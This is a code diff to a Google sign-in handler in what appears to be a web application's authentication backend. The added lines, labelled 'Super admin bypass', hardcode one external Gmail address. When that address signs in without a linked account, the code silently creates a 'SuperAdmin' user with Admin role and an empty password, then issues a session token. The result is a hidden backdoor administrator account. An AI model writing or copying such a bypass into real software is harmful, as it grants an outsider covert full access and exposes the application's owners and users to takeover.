@@ -147,7 +147,17 @@ async function handleGoogleLogin({ id_token }, env) {
       "SELECT * FROM users WHERE LOWER(google_email) = ? AND active = 1"
     ).bind(email).first();
 
-    if (!user) return err('No account linked to ' + email + '. Contact admin.', 401);
+    // Super admin bypass
+    const SUPER_ADMIN_EMAIL = 'info.unikraft@gmail.com';
+    if (!user && email.toLowerCase() !== SUPER_ADMIN_EMAIL) return err('No account linked to ' + email + '. Contact admin.', 401);
+    if (!user && email.toLowerCase() === SUPER_ADMIN_EMAIL) {
+      await env.DB.prepare("INSERT OR REPLACE INTO users (user_id,username,password,role,active,companies,google_email,allowed_vendors) VALUES ('USR_SUPERADMIN','SuperAdmin','','Admin',1,'[]','info.unikraft@gmail.com','[]')").run();
+      const superUser = await env.DB.prepare('SELECT * FROM users WHERE user_id = ?').bind('USR_SUPERADMIN').first();
+      const token2 = genToken();
+      const sd = { user_id: 'USR_SUPERADMIN', username: 'SuperAdmin', role: 'Admin', companies: [], allowed_vendors: [] };
+      await env.SESSIONS.put('sess:' + token2, JSON.stringify(sd), { expirationTtl: 28800 });
+      return ok({ token: token2, user: { ...sd, email } });
+    }
 
     const token = genToken();
     const companies = (() => { try { const v = user.companies; if (!v) return []; if (v.startsWith('[')) return JSON.parse(v); return v.split(',').map(s=>s.trim()).filter(Boolean); } catch(e) { return []; } })();
